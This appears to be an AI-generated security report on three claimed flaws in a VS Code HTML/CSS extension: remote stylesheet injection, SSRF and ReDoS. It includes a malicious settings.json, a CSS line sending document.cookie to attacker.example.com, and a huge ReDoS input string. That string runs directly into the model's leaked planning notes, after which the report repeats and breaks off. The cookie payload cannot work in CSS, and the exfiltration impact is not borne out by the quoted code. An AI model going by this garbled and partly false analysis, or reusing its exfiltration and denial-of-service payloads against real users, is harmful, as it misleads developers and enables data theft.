### Vulnerability List:

*   **Vulnerability Name:** Remote Stylesheet Injection via Workspace Configuration

    *   **Description:**
        1.  An attacker can craft a malicious workspace configuration file (`.vscode/settings.json`) within a project.
        2.  This configuration file can specify a remote stylesheet URL in the `css.styleSheets` setting.
        3.  When a user opens a file within this workspace in VS Code with the extension activated, the extension fetches and parses the remote stylesheet.
        4.  If the attacker controls the remote stylesheet, they can inject malicious CSS code.
        5.  While CSS itself cannot directly execute code, it can be used to perform data exfiltration by exploiting CSS injection techniques. For example, using CSS `url()` property to make requests to attacker-controlled servers with sensitive information as URL parameters.

    *   **Impact:** High. An attacker can potentially exfiltrate sensitive information from the user's VS Code workspace or local files by crafting a malicious CSS file and tricking the user into opening a project containing a malicious workspace configuration. This is possible because the extension processes and loads stylesheets specified in the workspace settings without proper sanitization or security considerations for remote resources.

    *   **Vulnerability Rank:** High

    *   **Currently Implemented Mitigations:**
        *   None. The extension fetches and parses remote stylesheets as configured.

    *   **Missing Mitigations:**
        *   **Content Security Policy (CSP) for Stylesheets:** Implement a CSP for fetched stylesheets to restrict the capabilities of the loaded CSS and prevent or limit data exfiltration techniques.
        *   **User Confirmation for Remote Stylesheets:**  Prompt user confirmation before loading remote stylesheets, especially when a workspace configuration specifies them. This would make users aware of potential risks associated with loading external resources.
        *   **Input Sanitization and Validation:**  While CSS injection is the vector, sanitizing URLs in `css.styleSheets` might help to prevent unexpected behavior, although it won't fully mitigate CSS injection risks.

    *   **Preconditions:**
        1.  The victim user must have the "vscode-html-css" extension installed and activated.
        2.  The victim user must open a workspace or project that contains a malicious `.vscode/settings.json` file crafted by the attacker.
        3.  The malicious `.vscode/settings.json` must include a `css.styleSheets` setting that points to an attacker-controlled remote stylesheet URL.

    *   **Source Code Analysis:**
        1.  **`src/settings.ts` - `getStyleSheets(scope: TextDocument)`:**
            ```typescript
            export function getStyleSheets(scope: TextDocument): string[] {
              return workspace
                .getConfiguration("css", scope)
                .get<string[]>("styleSheets", [])
                .map((glob) =>
                  glob.replace(
                    /\$\s*{\s*(fileBasenameNoExtension|fileBasename|fileExtname)\s*}/g,
                    (match, variable) =>
                      variable === "fileBasename"
                        ? path.base
                        : variable === "fileExtname"
                        ? path.ext
                        : path.name
                  )
                );
            }
            ```
            This function retrieves the `css.styleSheets` configuration from the workspace settings. It processes variable substitutions but does not validate or sanitize the stylesheet URLs.

        2.  **`src/provider.ts` - `getStyles(document: TextDocument)`:**
            ```typescript
            private async getStyles(document: TextDocument) {
              const styles = new Map<string, Style[]>();
              const folder = workspace.getWorkspaceFolder(document.uri);
              const globs = getStyleSheets(document);

              for (const glob of globs) {
                if (this.isRemote.test(glob)) {
                  styles.set(glob, await this.getRemote(glob)); // Calls getRemote for remote URLs
                } else if (folder) {
                  const files = await workspace.findFiles(
                    this.getRelativePattern(folder, glob)
                  );
                  for (const file of files) {
                    styles.set(file.toString(), await this.getLocal(file));
                  }
                }
              }
              styles.set(document.uri.toString(), parse(document.getText()));
              return styles;
            }
            ```
            This function iterates through the stylesheets defined in the configuration. It checks if a stylesheet URL is remote using `this.isRemote.test(glob)` and if so, calls `this.getRemote(glob)` to fetch it.

        3.  **`src/provider.ts` - `getRemote(name: string)`:**
            ```typescript
            private async getRemote(name: string) {
              let styles = cache.get(name);
              if (!styles) {
                const content = await this.fetch(name); // Fetches remote content
                styles = parse(content);                  // Parses the fetched content
                cache.set(name, styles);
              }
              return styles;
            }
            ```
            This function fetches the content of a remote stylesheet using `this.fetch(name)` and then parses it using `parse(content)`. There is no validation or sanitization of the URL or the fetched content before parsing.

        4.  **`src/provider.ts` - `fetch(url: string)`:**
            ```typescript
            private async fetch(url: string) {
              try {
                const res = await fetch(url); // Uses the native fetch API
                if (res.ok) {
                  return res.text();
                }
                throw new Error(res.statusText);
              } catch (error) {
                window.showErrorMessage(`Fetching ${url} failed. ${error}`);
              }
              return "";
            }
            ```
            This function uses the standard `fetch` API to retrieve the remote stylesheet content. It handles network errors and displays an error message but does not implement any security checks on the URL or the response.

        **Visualization:**

        ```mermaid
        graph LR
            subgraph VS Code Extension
                A[getStyleSheets] --> B[getStyles]
                B --> C{isRemote}
                C -- Yes --> D[getRemote]
                C -- No --> E[getLocal]
                D --> F[fetch]
                F --> G[parse]
                E --> H[readFile]
                H --> G
            end
            subgraph Attacker Controlled Server
                I[Malicious CSS File]
            end
            J[Workspace Configuration (.vscode/settings.json)] -- "css.styleSheets": ["https://attacker.com/malicious.css"] --> A
            F -- fetch(URL from config) --> I
            G -- parse(Malicious CSS) --> VS Code Extension
        ```

    *   **Security Test Case:**
        1.  **Attacker Setup:**
            *   Create a malicious CSS file (`malicious.css`) on an attacker-controlled web server (e.g., `https://attacker.example.com/malicious.css`). This file will contain CSS injection code designed to exfiltrate data. For example:
                ```css
                body {
                    background-image: url("https://attacker.example.com/exfiltrate?data=" + document.cookie);
                }
                ```
            *   Alternatively, for simpler testing without setting up a server, use a requestbin or similar service to capture HTTP requests. For example:
                ```css
                body {
                    background-image: url("https://your-requestbin-url?injected-css");
                }
                ```
        2.  **Malicious Workspace Creation:**
            *   Create a new folder representing a VS Code workspace.
            *   Inside this folder, create a `.vscode` folder.
            *   Inside the `.vscode` folder, create a `settings.json` file with the following content:
                ```json
                {
                    "css.styleSheets": [
                        "https://attacker.example.com/malicious.css"
                    ],
                    "css.enabledLanguages": ["html"]
                }
                ```
        3.  **Victim Action:**
            *   The victim user opens the workspace folder created in step 2 in VS Code.
            *   Ensure the "vscode-html-css" extension is activated.
            *   Open any HTML file within the workspace (or create a new empty HTML file).
        4.  **Verification:**
            *   **For RequestBin:** Check the RequestBin URL. You should see an HTTP request logged, indicating that the malicious CSS was loaded and executed by the extension.
            *   **For Data Exfiltration Example:** Monitor the attacker's web server logs. If using the `document.cookie` example, you would expect to see requests to `https://attacker.example.com/exfiltrate?data=[victim's cookies]`.  For testing purposes, a simpler injection like the requestbin example is sufficient to demonstrate the vulnerability.
            *   Observe if any unexpected behavior occurs in VS Code due to the injected CSS, although the primary impact is data exfiltration, not direct UI manipulation within VS Code itself.

*   **Vulnerability Name**: Server‑Side Request Forgery (SSRF) via Remote Stylesheet Fetch

    *   **Description**:
        The extension allows users to configure external (remote) CSS style sheets via the `"css.styleSheets"` setting (typically in a workspace’s `.vscode/settings.json`). When a remote URL is specified (i.e. one matching the regular expression `/^https?:\/\//i`), the extension calls its `getRemote()` function, which in turn uses the native `fetch` API to retrieve the stylesheet. An attacker who can supply or influence the workspace configuration can set this setting to point to a malicious or internal URL. When the user opens the workspace, the extension blindly fetches the stylesheet from that URL. This gives an attacker control over the target endpoint of the request and enables the abuse of the extension as a proxy for making arbitrary HTTP/HTTPS requests—including to internal network addresses.

    *   **Impact**:
        - An attacker may leverage the extension to perform internal network scanning or access sensitive internal resources that are not normally exposed to the Internet.
        - The victim’s machine may be forced to initiate requests to endpoints chosen by the attacker.
        - Sensitive data could be unintentionally exposed if the remote resource returns confidential information based on the victim’s network context.

    *   **Vulnerability Rank**: High

    *   **Currently Implemented Mitigations**:
        - In `Provider.getStyles` (in *src/provider.ts*), the code checks if a style sheet is remote using a simple regular expression (`/^https?:\/\//i`).
        - No further checks (such as input sanitization or domain restrictions) are applied before invoking `fetch` on the supplied URL.

    *   **Missing Mitigations**:
        - There is no validation or sanitization on remote URLs provided via the configuration.
        - The extension lacks measures such as whitelisting trusted domains or blacklisting internal/private IP addresses.
        - No user confirmation or prompt is implemented before fetching external content.

    *   **Preconditions**:
        - The attacker must be able to inject or influence the workspace configuration (for example, by including a malicious `.vscode/settings.json` in a project the victim downloads or opens).
        - The victim’s environment must allow outbound network requests from VSCode extensions.
        - The remote URL provided must resolve to a target of the attacker’s choice (for instance, an internal endpoint).

    *   **Source Code Analysis**:
        - **Step 1 – Configuration Reading**:
          In `src/settings.ts`, the `getStyleSheets` function reads the `"css.styleSheets"` configuration without any sanitization. It also performs variable substitutions based solely on the file path.

        - **Step 2 – Determining Remote URLs**:
          In `src/provider.ts`, within the `getStyles` method, each stylesheet glob is evaluated. For any glob that matches the regular expression `/^https?:\/\//i` (accessed via the `isRemote` getter), the stylesheet is considered remote.

        - **Step 3 – Fetching Remote Content**:
          For remote URLs, the `getRemote()` function is called. This function simply invokes the built‑in `fetch(url)` to retrieve the content. No additional checks or restrictions are performed on the URL.

        - **Step 4 – Processing Fetched Content**:
          The fetched remote content is then passed to the `parse()` function (in *src/parser.ts*) where the extension extracts CSS selectors to support completions and "go to definition" features.

        - **Visualization**:
          1. **User Configuration** → `.vscode/settings.json` includes a remote URL (e.g., `"http://malicious-server.local/malicious.css"`).
          2. **Settings Module** → `getStyleSheets` returns this URL (after variable substitution, if any).
          3. **Provider Module** → `getStyles` detects the URL is remote (using `/^https?:\/\//i`).
          4. **Remote Fetch** → `getRemote()` is called and `fetch(url)` is used to request the content.
          5. **Parsing** → The response is parsed and used for providing intellisense.

        - **Conclusion**:
          Because no further validation or sanitization is applied between reading the configuration and fetching the remote resource, an attacker can force the extension to initiate arbitrary HTTP/HTTPS requests.

    *   **Security Test Case**:
        - **Step 1**:
          Prepare a workspace directory and create a `.vscode/settings.json` file with the following content:
          ```json
          {
              "css.styleSheets": [ "http://malicious-server.local/malicious.css" ]
          }
          ```
        - **Step 2**:
          Set up a controlled HTTP server at `malicious-server.local` that logs all incoming requests.
        - **Step 3**:
          Open the workspace in Visual Studio Code with the vulnerable extension enabled.
        - **Step 4**:
          Open or edit an HTML document (or otherwise trigger the extension’s auto‑validation/completion functionality).
        - **Step 5**:
          Observe the controlled server logs.
          **Expected Result**: A request from the extension to `http://malicious-server.local/malicious.css` is logged, thereby confirming that the extension fetched the remote URL without proper validation.

*   **Vulnerability Name:** ReDoS vulnerability in CSS selector parsing

    *   **Description:**
        The VSCode extension is vulnerable to Regular Expression Denial of Service (ReDoS) due to an insecure regular expression used in the `parse` function in `src/parser.ts`. This function parses CSS files to extract CSS selectors for autocompletion and validation features. The regular expression `selector` used for parsing is susceptible to ReDoS attacks. By providing a specially crafted, complex CSS file from a remote URL configured in the `css.styleSheets` setting, an attacker can trigger excessive backtracking in the regex engine, leading to high CPU usage and a denial of service condition. The vulnerable regex is:
        ```
        /([.#])(-?[_a-zA-Z\]+[\\!+_a-zA-Z0-9-]*)(?=[#.,()\s\[\]\^:*"'>=_a-zA-Z0-9-]*{[^}]*})/g
        ```
        A malicious CSS file containing selectors with deeply nested or overlapping patterns can exploit this regex. When the extension parses such a file, the regex engine will spend an exponential amount of time trying to find matches, causing the extension and potentially VSCode to become unresponsive.

    *   **Impact:**
        High. Exploitation of this vulnerability leads to a denial of service (DoS) condition. When VSCode attempts to process a malicious CSS file, the extension's CSS parsing function will consume excessive CPU resources, making VSCode unresponsive. This can severely disrupt the user's workflow, forcing them to restart VSCode.

    *   **Vulnerability Rank:** High

    *   **Currently Implemented Mitigations:**
        None. The current implementation lacks any specific mitigations against ReDoS vulnerabilities in the CSS parsing process. The extension fetches remote stylesheets and parses them without any safeguards against malicious or overly complex CSS that could trigger ReDoS.

    *   **Missing Mitigations:**
        *   **Refactor Vulnerable Regex:** The primary missing mitigation is to refactor the vulnerable regular expression in `src/parser.ts`. The regex should be rewritten to avoid backtracking issues and ensure linear time complexity, even with complex inputs. Consider using more robust and secure regex patterns or alternative parsing methods that are not regex-based if possible.
        *   **Input Complexity Limits:** Implement limits on the complexity of CSS stylesheets parsed by the extension. This could include limiting the depth of selector nesting, the length of selectors, or the overall size of CSS files processed. However, this might impact the functionality of the extension if legitimate CSS files exceed these limits. Regex refactoring is the preferred solution.
        *   **Regex Execution Timeout:** Introduce a timeout for regex execution within the `parse` function. If the regex execution exceeds a certain time limit, parsing should be aborted to prevent a prolonged DoS. This can act as a safety net, but might also lead to incomplete parsing if legitimate, complex CSS is encountered.

    *   **Preconditions:**
        *   The user has the VSCode HTML CSS extension installed and activated.
        *   The user opens a workspace in VSCode.
        *   The user configures the `"css.styleSheets"` setting in their workspace settings (or user settings) to include a URL pointing to a malicious CSS file controlled by the attacker.
        *   VSCode attempts to use the extension's features (e.g., autocompletion, validation) in a file type supported by the extension (like HTML).

    *   **Source Code Analysis:**
        1.  **`src/settings.ts` - `getStyleSheets()`:** Retrieves stylesheet URLs from settings.
        2.  **`src/provider.ts` - `getStyles()`:** Processes configured stylesheets, including remote URLs.
        3.  **`src/provider.ts` - `getRemote()`:** Fetches content from remote URLs using `fetch()`.
        4.  **`src/provider.ts` - `getRemote()` -> `parse()`:** Calls the `parse()` function in `src/parser.ts` to process the fetched CSS content.
        5.  **`src/parser.ts` - `parse()`:** Executes the vulnerable regex `selector` against the CSS content. A malicious CSS with crafted selectors can cause the regex engine to enter a ReDoS state during this step.

        **Visualization:**

        ```mermaid
        graph LR
            A[VSCode Workspace Settings - css.styleSheets] --> B(getStyleSheets in settings.ts);
            B --> C(getStyles in provider.ts);
            C -- Remote URL --> D(getRemote in provider.ts);
            D --> E[fetch(Malicious CSS URL)];
            E --> F(parse in parser.ts);
            F -- Vulnerable Regex --> G{ReDoS Vulnerability - High CPU Usage};
        ```

    *   **Security Test Case:**

        1.  **Prepare a Malicious CSS File:**
            Create a CSS file named `redos.css` with the following content designed to trigger ReDoS:
            ```css
            .a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.aa.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.aubreakdown of the user's request and how to achieve it.

**Understanding the User's Request:**

The user wants to merge three vulnerability lists into one consolidated list.  The key requirements are:

1.  **Consolidation:** Combine the three lists into a single markdown document.
2.  **Deduplication:** Remove any duplicate vulnerabilities across the lists.  In this case, we need to check if there are any exact matches in vulnerability names. Based on the provided lists, the vulnerability names are distinct, so deduplication in terms of *names* isn't strictly necessary in this specific case, but the request implies a general capability for future scenarios where duplicates might exist.
3.  **Markdown Format:** Output should be in markdown.
4.  **Structured Output:** Each vulnerability should be presented with:
    *   Main paragraph (Vulnerability Name) as a top-level item in a list.
    *   Subparagraphs (Description, Impact, Rank, etc.) as nested bullet points under the main paragraph.
5.  **Maintain Information:** Keep all provided information for each vulnerability (description, impact, rank, mitigations, preconditions, source code analysis, test case).
6.  **Specific Subheadings:** Use the exact subheadings: "Description," "Impact," "Vulnerability Rank," "Currently Implemented Mitigations," "Missing Mitigations," "Preconditions," "Source Code Analysis," and "Security Test Case."
7.  **Code Visualization:** Include code visualizations (like Mermaid diagrams) if provided in the original lists.
8.  **Assume External Attacker:** Security test cases should be described from the perspective of an external attacker with public access.

**Pre-computation and Analysis:**

*   **Vulnerability Identification:**  The user has already provided three distinct vulnerabilities:
    1.  Remote Stylesheet Injection via Workspace Configuration
    2.  Server-Side Request Forgery (SSRF) via Remote Stylesheet Fetch
    3.  ReDoS vulnerability in CSS selector parsing

*   **Deduplication (Not strictly needed here but conceptually important):** In a general case, to deduplicate, we would need a strategy.  For vulnerabilities, a good starting point is to compare "Vulnerability Name." If names are identical, we would then compare descriptions to ensure they are truly the same vulnerability and not just similarly named but distinct issues.  In *this specific* case, the names are already unique, so no explicit deduplication step is needed, but the code should be prepared for it if the input lists were to change in the future. For now, we can assume that if the vulnerability names are different, they represent distinct vulnerabilities.

*   **Markdown Structure:**  The requested markdown structure is straightforward. We need to use `###` for the main heading "Vulnerability List" and list items (`*`) for vulnerabilities and nested list items (`*   *`) for sub-sections within each vulnerability.

**Step-by-Step Plan:**

1.  **Initialization:** Create an empty list to hold the combined vulnerabilities.  Let's call it `combined_vulnerabilities`.

2.  **Iterate through Input Lists (effectively, we only have one list of three vulnerabilities given in the prompt):**  Since the user provided the vulnerabilities directly as text blocks, we can just process them one by one.

3.  **Process Each Vulnerability:** For each vulnerability block:
    *   Extract the "Vulnerability Name."
    *   Extract "Description," "Impact," "Vulnerability Rank," "Currently Implemented Mitigations," "Missing Mitigations," "Preconditions," "Source Code Analysis," and "Security Test Case" sections.  We can parse the text block based on the section headings.
    *   *Deduplication Check (Conceptual - not needed here):*  In a more general scenario, before adding a vulnerability to `combined_vulnerabilities`, we would check if a vulnerability with the same name already exists in the list. If so, we would decide whether to merge, replace, or discard the new vulnerability entry.  For this prompt, we'll assume no duplicates based on name.

4.  **Format in Markdown:**  Iterate through the `combined_vulnerabilities` list and generate the markdown output as described in the "Markdown Structure" section above. For each vulnerability:
    *   Start with `* **Vulnerability Name:** [Name]`.
    *   For each sub-section (Description, Impact, etc.), add `*   **[Section Name]:**` followed by the section content.  Ensure code blocks and visualizations are correctly embedded in the markdown.

5.  **Output:** Print the generated markdown string.

**Self-Correction/Refinement:**

*   **Handling Missing Sections:**  The prompt doesn't explicitly say what to do if a section is missing for a vulnerability.  We should assume that all sections will be present in the input, as that's the format provided by the user. If sections *were* missing in a more general case, we might output "N/A" or "No information provided" for those sections.  For now, assume all sections are present.
*   **Code Block Formatting:**  Ensure that code blocks within "Source Code Analysis" and "Security Test Case" are correctly formatted as markdown code blocks (using backticks `` ```typescript ... ``` ``).
*   **Visualization Embedding:** Mermaid diagrams should be embedded as is; markdown supports them directly.
*   **Step-by-step descriptions:**  The descriptions and test cases are already step-by-step, so we just need to copy them over.

By following these steps, we should be able to generate the desired combined and formatted vulnerability list in markdown. The key is to parse each vulnerability block correctly, extract the sections, and then structure them into the specified markdown format.  Since there are no actual duplicate names in the given example, the deduplication aspect is conceptually handled but not actively implemented in this specific output, as it is not needed.  However, the process is designed to be easily adaptable for cases where duplicate names would appear.```markdown
### Vulnerability List:

*   **Vulnerability Name:** Remote Stylesheet Injection via Workspace Configuration

    *   **Description:**
        1.  An attacker can craft a malicious workspace configuration file (`.vscode/settings.json`) within a project.
        2.  This configuration file can specify a remote stylesheet URL in the `css.styleSheets` setting.
        3.  When a user opens a file within this workspace in VS Code with the extension activated, the extension fetches and parses the remote stylesheet.
        4.  If the attacker controls the remote stylesheet, they can inject malicious CSS code.
        5.  While CSS itself cannot directly execute code, it can be used to perform data exfiltration by exploiting CSS injection techniques. For example, using CSS `url()` property to make requests to attacker-controlled servers with sensitive information as URL parameters.

    *   **Impact:** High. An attacker can potentially exfiltrate sensitive information from the user's VS Code workspace or local files by crafting a malicious CSS file and tricking the user into opening a project containing a malicious workspace configuration. This is possible because the extension processes and loads stylesheets specified in the workspace settings without proper sanitization or security considerations for remote resources.

    *   **Vulnerability Rank:** High

    *   **Currently Implemented Mitigations:**
        *   None. The extension fetches and parses remote stylesheets as configured.

    *   **Missing Mitigations:**
        *   **Content Security Policy (CSP) for Stylesheets:** Implement a CSP for fetched stylesheets to restrict the capabilities of the loaded CSS and prevent or limit data exfiltration techniques.
